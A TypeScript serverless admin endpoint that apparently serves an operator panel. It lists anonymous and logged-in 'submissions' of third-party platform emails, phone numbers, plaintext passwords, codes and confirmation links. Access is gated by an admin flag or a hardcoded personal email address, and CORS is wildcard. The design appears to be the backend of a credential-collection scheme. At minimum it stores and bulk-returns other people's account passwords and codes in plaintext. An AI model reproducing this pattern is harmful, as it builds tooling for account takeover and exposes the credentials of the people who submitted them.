import { createClient } from '@supabase/supabase-js';

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

console.log('[admin-submissions] Initializing:', {
  hasSupabaseUrl: !!supabaseUrl,
  hasServiceRoleKey: !!supabaseServiceRoleKey,
});

if (!supabaseUrl || !supabaseServiceRoleKey) {
  console.error('[admin-submissions] MISSING ENV VARS - Admin route will fail until configured');
}

const supabaseAdmin = supabaseUrl && supabaseServiceRoleKey ? createClient(supabaseUrl, supabaseServiceRoleKey, {
  auth: {
    persistSession: false,
  },
}) : null;

export default async function handler(req: any, res: any) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  const startTime = Date.now();
  const logPrefix = `[admin-submissions] [${new Date().toISOString()}]`;

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'GET') {
    res.setHeader('Allow', 'GET');
    console.log(`${logPrefix} Invalid method: ${req.method}`);
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Check if Supabase is configured
  if (!supabaseAdmin) {
    console.error(`${logPrefix} Supabase not configured - missing SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY`);
    return res.status(500).json({
      error: 'Server not configured. Admin route requires SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY environment variables.',
    });
  }

  try {
    // Get authorization header
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      console.log(`${logPrefix} Missing auth header`);
      return res.status(401).json({ error: 'Missing or invalid authorization header' });
    }

    const token = authHeader.substring(7);
    console.log(`${logPrefix} Auth token received, length: ${token.length}`);

    // Verify the token and get the user
    console.log(`${logPrefix} Verifying token with Supabase admin client...`);
    const { data: { user }, error: userError } = await supabaseAdmin.auth.getUser(token);

    if (userError || !user) {
      console.error(`${logPrefix} Auth error:`, userError);
      return res.status(401).json({ error: 'Unauthorized' });
    }

    console.log(`${logPrefix} User verified: ${user.email} (${user.id})`)

    // Check if user is admin
    const { data: profile, error: profileError } = await supabaseAdmin
      .from('profiles')
      .select('is_admin')
      .eq('id', user.id)
      .maybeSingle();

    if (profileError) {
      console.error(`${logPrefix} Profile query error:`, profileError);
      return res.status(500).json({ error: 'Failed to verify admin status' });
    }

    // Check if user is admin or owner
    const isOwner = user.email === 'gibsonkobia@gmail.com';
    const isAdmin = profile?.is_admin || isOwner;

    console.log(`${logPrefix} Admin check - is_admin: ${profile?.is_admin}, isOwner: ${isOwner}, result: ${isAdmin}`);

    if (!isAdmin) {
      console.log(`${logPrefix} Access denied: user not admin`);
      return res.status(403).json({ error: 'User does not have admin access' });
    }

    // Fetch authenticated user submissions
    console.log(`${logPrefix} Fetching platform_connections...`);
    const { data: connections, error: connectionsError } = await supabaseAdmin
      .from('platform_connections')
      .select('id, platform, email, phone, third_party_password, code, status, created_at, user_id, confirmation_link')
      .order('created_at', { ascending: false });

    if (connectionsError) {
      console.error(`${logPrefix} Connections query error:`, connectionsError);
      return res.status(500).json({ error: 'Failed to load authenticated submissions' });
    }
    console.log(`${logPrefix} Got ${connections?.length || 0} platform_connections`);

    // Fetch anonymous/public submissions
    console.log(`${logPrefix} Fetching platform_connection_requests...`);
    const { data: requests, error: requestsError } = await supabaseAdmin
      .from('platform_connection_requests')
      .select('id, platform, email, phone, third_party_password, created_at, status, code')
      .order('created_at', { ascending: false });

    if (requestsError) {
      console.error(`${logPrefix} Requests query error:`, requestsError);
      return res.status(500).json({ error: 'Failed to load public submissions' });
    }
    console.log(`${logPrefix} Got ${requests?.length || 0} platform_connection_requests`);

    // Merge and return data
    const mergedSubmissions = [
      ...(connections || []).map((row: any) => ({
        id: row.id,
        platform: row.platform,
        email: row.email,
        phone: row.phone,
        third_party_password: row.third_party_password,
        code: row.code,
        created_at: row.created_at,
        user_id: row.user_id,
        status: row.status || 'active',
        source: 'platform_connections',
        confirmation_link: row.confirmation_link || null,
      })),
      ...(requests || []).map((row: any) => ({
        id: row.id,
        platform: row.platform,
        email: row.email,
        phone: row.phone,
        third_party_password: row.third_party_password,
        created_at: row.created_at,
        user_id: null,
        status: row.status || 'pending',
        source: 'platform_connection_requests',
        code: row.code,
      })),
    ].sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());

    const elapsed = Date.now() - startTime;
    console.log(`${logPrefix} Success - returning ${mergedSubmissions.length} merged submissions (${elapsed}ms)`);

    return res.status(200).json({
      success: true,
      data: mergedSubmissions,
      adminEmail: user.email,
      isOwner: isOwner,
    });
  } catch (error) {
    const elapsed = Date.now() - startTime;
    console.error(`${logPrefix} Handler error (${elapsed}ms):`, error);
    return res.status(500).json({
      error: 'Failed to fetch admin submissions. Please try again later.',
    });
  }
}
